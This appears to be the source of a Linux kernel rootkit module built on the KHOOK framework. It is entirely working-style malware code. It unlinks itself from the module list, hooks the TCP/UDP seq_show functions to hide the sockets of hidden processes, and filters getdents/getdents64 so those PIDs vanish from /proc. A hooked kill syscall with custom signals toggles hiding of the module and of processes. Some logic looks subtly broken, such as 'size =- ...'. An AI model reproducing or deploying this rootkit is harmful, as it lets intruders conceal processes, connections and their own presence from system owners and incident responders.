#include "../inc/myrootkit.h"



MODULE_LICENSE("GPL");

static struct list_head *prev_mod;
static int is_hidden = 0;
void module_hide(void){
    if (!is_hidden){
        prev_mod = THIS_MODULE->list.prev;
        is_hidden = 1;
        printk(KERN_ALERT "MODULE JUST HIDDEN\n!");
        list_del(&THIS_MODULE->list);
        
    }
}

void module_show(void){
    if (is_hidden){
        
        is_hidden = 0;
        printk(KERN_ALERT "MODULE JUST SHOWN\n!");
        list_add(&THIS_MODULE->list, prev_mod);
    }
}




/*
KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
static int khook_tcp4_seq_show(struct seq_file *seq, void *v) {
    int buf_len = seq->count;
    struct sock *sk = (struct sock *)v;
    struct seq_file __user *seq_usr = seq;
    char *buf = kzalloc(sizeof(char)* buf_len, GFP_KERNEL);
    if (buf == NULL){
        return KHOOK_ORIGIN(tcp4_seq_show, seq, v);    
    }
    if (v == SEQ_START_TOKEN){
        printk(KERN_DEBUG "SEQ START TOKEN");
        return KHOOK_ORIGIN(tcp4_seq_show, seq, v);
    }
    copy_from_user(buf, seq_usr->buf, buf_len);
    KHOOK_ORIGIN(tcp4_seq_show, seq, v);
    if (sk != NULL){
            struct task_struct *socket_proccess = NULL;
            if (sk->sk_socket && sk->sk_socket->file){
                
                socket_proccess = get_pid_task(sk->sk_socket->file->f_owner.pid, PIDTYPE_PID);
            }else{
                printk(KERN_DEBUG "NULL SK FILE");
            }
            if (socket_proccess == NULL){
                printk(KERN_ALERT "cant get pid of socket's process");
                return 0;
            }
            struct task_struct *p = current;
            for_each_process(p){
                if (is_pid_invisible(p->pid)){
                    if (p->pid == socket_proccess->pid){
                        copy_to_user(seq_usr->buf, buf, buf_len);
                        seq_usr->count = buf_len;//copy_to_user(&(seq_usr->count), &buf_len, sizeof(int));
                        return 0;
                    }
                }
            }
    }
    printk(KERN_DEBUG "Sk NULL");
    return 0;
}

*/
KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
static int khook_tcp4_seq_show(struct seq_file *seq, void *v) {
    int buf_len = seq->count;
    struct sock *sk = (struct sock *)v;
    struct seq_file __user *seq_usr = seq;
    char *buf = kzalloc(sizeof(char)* buf_len, GFP_KERNEL);
    if (buf == NULL){
        return KHOOK_ORIGIN(tcp4_seq_show, seq, v);    
    }
    if (v == SEQ_START_TOKEN){
        printk(KERN_DEBUG "SEQ START TOKEN");
        return KHOOK_ORIGIN(tcp4_seq_show, seq, v);
    }
    copy_from_user(buf, seq_usr->buf, buf_len);
    KHOOK_ORIGIN(tcp4_seq_show, seq, v);
    if (sk != NULL){
            struct inode *socket_inode = NULL;
            if (sk->sk_socket && sk->sk_socket->file){
                
                socket_inode = file_inode(sk->sk_socket->file);
            }else{
                printk(KERN_DEBUG "NULL SK FILE");
            }
            if (socket_inode == NULL){
                printk(KERN_ALERT "cant get pid of socket's process");
                return 0;
            }
            struct task_struct *p = current;
            
            for_each_process(p){
                if (is_pid_invisible(p->pid)){
                    struct files_struct *files = p->files;
                    if (!files){
                        printk(KERN_DEBUG "NO FILES IN CUR INVIS PROCESS");
                        return 0;
                    }
                    spin_lock(&files->file_lock);
                    struct fdtable* files_table = files_fdtable(files);
                    for (int i = 0; i < files_table->max_fds; i ++){
                        if (files_table->fd[i] != NULL){
                            if (files_table->fd[i]->f_inode == socket_inode){
                                copy_to_user(seq_usr->buf, buf, buf_len);
                                seq_usr->count = buf_len;
                                spin_unlock(&files->file_lock);
                                return 0;
                            }
                        }
                    }
                    spin_unlock(&files->file_lock);
                    
                }
            }
    }
    printk(KERN_DEBUG "Sk NULL");
    return 0;
}


KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);
static int khook_udp4_seq_show(struct seq_file *seq, void *v) {
    int buf_len = seq->count;
    struct sock *sk = (struct sock *)v;
    struct seq_file __user *seq_usr = seq;
    char *buf = kzalloc(sizeof(char)* buf_len, GFP_KERNEL);
    if (buf == NULL){
        return KHOOK_ORIGIN(udp4_seq_show, seq, v);    
    }
    if (v == SEQ_START_TOKEN){
        printk(KERN_DEBUG "SEQ START TOKEN");
        return KHOOK_ORIGIN(udp4_seq_show, seq, v);
    }
    copy_from_user(buf, seq_usr->buf, buf_len);
    KHOOK_ORIGIN(udp4_seq_show, seq, v);
    if (sk != NULL){
            struct inode *socket_inode = NULL;
            if (sk->sk_socket && sk->sk_socket->file){
                
                socket_inode = file_inode(sk->sk_socket->file);
            }else{
                printk(KERN_DEBUG "NULL SK FILE");
            }
            if (socket_inode == NULL){
                printk(KERN_ALERT "cant get pid of socket's process");
                return 0;
            }
            struct task_struct *p = current;
            
            for_each_process(p){
                if (is_pid_invisible(p->pid)){
                    struct files_struct *files = p->files;
                    if (!files){
                        printk(KERN_DEBUG "NO FILES IN CUR INVIS PROCESS");
                        return 0;
                    }
                    spin_lock(&files->file_lock);
                    struct fdtable* files_table = files_fdtable(files);
                    for (int i = 0; i < files_table->max_fds; i ++){
                        if (files_table->fd[i] != NULL){
                            if (files_table->fd[i]->f_inode == socket_inode){
                                copy_to_user(seq_usr->buf, buf, buf_len);
                                seq_usr->count = buf_len;
                                spin_unlock(&files->file_lock);
                                return 0;
                            }
                        }
                    }
                    spin_unlock(&files->file_lock);
                    
                }
            }
    }
    printk(KERN_DEBUG "Sk NULL");
    return 0;
}


KHOOK_EXT(int, tcp6_seq_show, struct seq_file *, void *);
static int khook_tcp6_seq_show(struct seq_file *seq, void *v) {
    int buf_len = seq->count;
    struct sock *sk = (struct sock *)v;
    struct seq_file __user *seq_usr = seq;
    char *buf = kzalloc(sizeof(char)* buf_len, GFP_KERNEL);
    if (buf == NULL){
        return KHOOK_ORIGIN(tcp6_seq_show, seq, v);    
    }
    if (v == SEQ_START_TOKEN){
        printk(KERN_DEBUG "SEQ START TOKEN");
        return KHOOK_ORIGIN(tcp6_seq_show, seq, v);
    }
    copy_from_user(buf, seq_usr->buf, buf_len);
    KHOOK_ORIGIN(tcp6_seq_show, seq, v);
    if (sk != NULL){
            struct inode *socket_inode = NULL;
            if (sk->sk_socket && sk->sk_socket->file){
                
                socket_inode = file_inode(sk->sk_socket->file);
            }else{
                printk(KERN_DEBUG "NULL SK FILE");
            }
            if (socket_inode == NULL){
                printk(KERN_ALERT "cant get pid of socket's process");
                return 0;
            }
            struct task_struct *p = current;
            
            for_each_process(p){
                if (is_pid_invisible(p->pid)){
                    struct files_struct *files = p->files;
                    if (!files){
                        printk(KERN_DEBUG "NO FILES IN CUR INVIS PROCESS");
                        return 0;
                    }
                    spin_lock(&files->file_lock);
                    struct fdtable* files_table = files_fdtable(files);
                    for (int i = 0; i < files_table->max_fds; i ++){
                        if (files_table->fd[i] != NULL){
                            if (files_table->fd[i]->f_inode == socket_inode){
                                copy_to_user(seq_usr->buf, buf, buf_len);
                                seq_usr->count = buf_len;
                                spin_unlock(&files->file_lock);
                                return 0;
                            }
                        }
                    }
                    spin_unlock(&files->file_lock);
                    
                }
            }
    }
    printk(KERN_DEBUG "Sk NULL");
    return 0;
}


KHOOK_EXT(int, udp6_seq_show, struct seq_file *, void *);
static int khook_udp6_seq_show(struct seq_file *seq, void *v) {
    int buf_len = seq->count;
    struct sock *sk = (struct sock *)v;
    struct seq_file __user *seq_usr = seq;
    char *buf = kzalloc(sizeof(char)* buf_len, GFP_KERNEL);
    if (buf == NULL){
        return KHOOK_ORIGIN(udp6_seq_show, seq, v);    
    }
    if (v == SEQ_START_TOKEN){
        printk(KERN_DEBUG "SEQ START TOKEN");
        return KHOOK_ORIGIN(udp6_seq_show, seq, v);
    }
    copy_from_user(buf, seq_usr->buf, buf_len);
    KHOOK_ORIGIN(udp6_seq_show, seq, v);
    if (sk != NULL){
            struct inode *socket_inode = NULL;
            if (sk->sk_socket && sk->sk_socket->file){
                
                socket_inode = file_inode(sk->sk_socket->file);
            }else{
                printk(KERN_DEBUG "NULL SK FILE");
            }
            if (socket_inode == NULL){
                printk(KERN_ALERT "cant get pid of socket's process");
                return 0;
            }
            struct task_struct *p = current;
            
            for_each_process(p){
                if (is_pid_invisible(p->pid)){
                    struct files_struct *files = p->files;
                    if (!files){
                        printk(KERN_DEBUG "NO FILES IN CUR INVIS PROCESS");
                        return 0;
                    }
                    spin_lock(&files->file_lock);
                    struct fdtable* files_table = files_fdtable(files);
                    for (int i = 0; i < files_table->max_fds; i ++){
                        if (files_table->fd[i] != NULL){
                            if (files_table->fd[i]->f_inode == socket_inode){
                                copy_to_user(seq_usr->buf, buf, buf_len);
                                seq_usr->count = buf_len;
                                spin_unlock(&files->file_lock);
                                return 0;
                            }
                        }
                    }
                    spin_unlock(&files->file_lock);
                    
                }
            }
    }
    printk(KERN_DEBUG "Sk NULL");
    return 0;
}

//учесть как получать inode, учесть 32 и 64 версии
KHOOK_EXT(long, __x64_sys_getdents64, const struct pt_regs *);
static long khook___x64_sys_getdents64(const struct pt_regs *regs){
    
    int fd;
    int size;
    struct inode *d_inode;
    struct linux_dirent64 __user *dirent_usr;
    struct linux_dirent64 *dirent_kern;


    fd = (int) regs->di;
    size = KHOOK_ORIGIN(__x64_sys_getdents64, regs);
    if (size <= 0){
        return size;
    }
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
    if (d_inode->i_ino != PROC_ROOT_INO)
        return size;
    dirent_usr = (struct linux_dirent64 *)regs->si;
    dirent_kern = kzalloc(size, GFP_KERNEL);
    if (dirent_kern == NULL){
        printk(KERN_ALERT "kzalloc error getdents64");
        return size;
    }
    int err = copy_from_user(dirent_kern, dirent_usr, size);
    if (err){
        kfree(dirent_kern);
        return size;
    }

    int offset = 0;
    struct linux_dirent64 *current_dirent, *prev = NULL;
    while(offset < size){
        current_dirent = (void *)dirent_kern + offset;
        if (is_pid_invisible(str_to_pid(current_dirent->d_name))){
            if (current_dirent == dirent_kern){
                size =- current_dirent->d_reclen;
                memmove(current_dirent, (void *)current_dirent+current_dirent->d_reclen, size);
                continue;
            }
            prev->d_reclen += current_dirent->d_reclen;

        }else{
            prev = current_dirent;
        }
        offset += current_dirent->d_reclen;
    }
    err = copy_to_user(dirent_usr, dirent_kern, size);
    
    
    kfree(dirent_kern);
    return size;
}




KHOOK_EXT(long, __x64_sys_getdents, const struct pt_regs *);
static long khook___x64_sys_getdents(const struct pt_regs *regs){
    
    struct linux_dirent{
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };
    int fd;
    int size;
    struct inode *d_inode;
    struct linux_dirent __user *dirent_usr;
    struct linux_dirent *dirent_kern;

    fd = (int) regs->di;
    size = KHOOK_ORIGIN(__x64_sys_getdents, regs);
    if (size <= 0){
        return size;
    }
#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
    if (d_inode->i_ino != PROC_ROOT_INO){
        return size;
    }
    
    dirent_usr = (struct linux_dirent *)regs->si;
    dirent_kern = kzalloc(size, GFP_KERNEL);
    if (dirent_kern == NULL){
        printk(KERN_ALERT "kzalloc error getdents64");
        return size;
    }
    int err = copy_from_user(dirent_kern, dirent_usr, size);
    if (err){
        kfree(dirent_kern);
        return size;
    }

    int offset = 0;
    struct linux_dirent *current_dirent, *prev = NULL;
    while(offset < size){
        current_dirent = (void *)dirent_kern + offset;
        if (is_pid_invisible(str_to_pid(current_dirent->d_name))){
            if (current_dirent == dirent_kern){
                size =- current_dirent->d_reclen;
                memmove(current_dirent, (void *)current_dirent+current_dirent->d_reclen, size);
                continue;
            }
            prev->d_reclen += current_dirent->d_reclen;

        }else{
            prev = current_dirent;
        }
        offset += current_dirent->d_reclen;
    }
    err = copy_to_user(dirent_usr, dirent_kern, size);
    
    kfree(dirent_kern);
    return size;
}



KHOOK_EXT(long, __x64_sys_kill, const struct  pt_regs *);
static long khook___x64_sys_kill(const struct pt_regs *regs){
    int sig = (int)regs->si;
    pid_t pid = (pid_t)regs->di;
    switch(sig){
    
        case SIGINVISMOD:
            if (!is_hidden)
                module_hide();
            else
                module_show();
           break;
        //ADD MAJOR
        case SIGINVISPROC:
            hide_full_process(pid);
            break;
        case SIGVISPROC:
            show_full_process(pid);
            break;
        default:
           return KHOOK_ORIGIN(__x64_sys_kill, regs);
    }
    return 0;
}






static int __init rootkit_init(void){
    khook_init();
    printk(KERN_ALERT "Hello world\n!");
    return 0;
}

static void __exit rootkit_exit(void){
    khook_cleanup();
    printk(KERN_ALERT "Goodbye world(((\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
